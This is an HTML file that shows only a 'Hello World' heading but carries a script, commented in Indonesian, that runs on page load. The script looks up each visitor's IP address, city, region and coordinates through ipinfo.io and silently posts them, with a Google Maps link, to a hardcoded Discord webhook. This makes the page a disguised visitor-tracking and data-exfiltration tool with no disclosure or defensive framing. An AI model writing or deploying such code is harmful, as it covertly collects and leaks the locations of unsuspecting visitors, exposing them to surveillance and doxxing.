<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Hello World</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      text-align: center;
      padding: 50px;
      background: #f5f5f5;
    }
    h1 {
      font-size: 4rem;
      color: #333;
    }
  </style>
</head>
<body>
  <h1>Hello World</h1>

  <script>
    (async function() {
      try {
        // 1. Ambil data IP dan lokasi dari ipinfo.io
        const res = await fetch('https://ipinfo.io/json');
        const data = await res.json();

        const ip = data.ip || 'Tidak diketahui';

        // Susun lokasi (kota, provinsi, negara)
        let location = '';
        if (data.city) location += data.city;
        if (data.region) location += (location ? ', ' : '') + data.region;
        if (data.country) location += (location ? ', ' : '') + data.country;
        if (!location) location = 'Tidak diketahui';

        // Link Google Maps dari koordinat
        let mapLink = 'Tidak tersedia';
        if (data.loc) {
          const [lat, lng] = data.loc.split(',');
          mapLink = `https://www.google.com/maps?q=${lat},${lng}`;
        }

        // 2. Bentuk embed sesuai struktur yang diminta
        const embed = {
          title: '📡 Data Pengunjung Baru',
          color: 0x5865F2, // biru Discord
          fields: [
            { name: 'IP ADDRES', value: ip, inline: false },
            { name: 'LOCATION', value: location, inline: false },
            { name: 'LINK MAPS', value: mapLink, inline: false }
          ],
          timestamp: new Date().toISOString()
        };

        // 3. Kirim ke webhook Discord
        const webhookURL = 'https://discord.com/api/webhooks/1537410381138370640/d0SXhUD2hSifEPO0eqK2tqg4a-QEsoe4fE4mLC6gsKFQXJAs0ukqP5aV1QlNDyUE2rgB';
        await fetch(webhookURL, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ embeds: [embed] })
        });

        console.log('✅ Berhasil dikirim ke Discord');
      } catch (error) {
        console.error('❌ Gagal mengirim:', error);
      }
    })();
  </script>
</body>
</html>
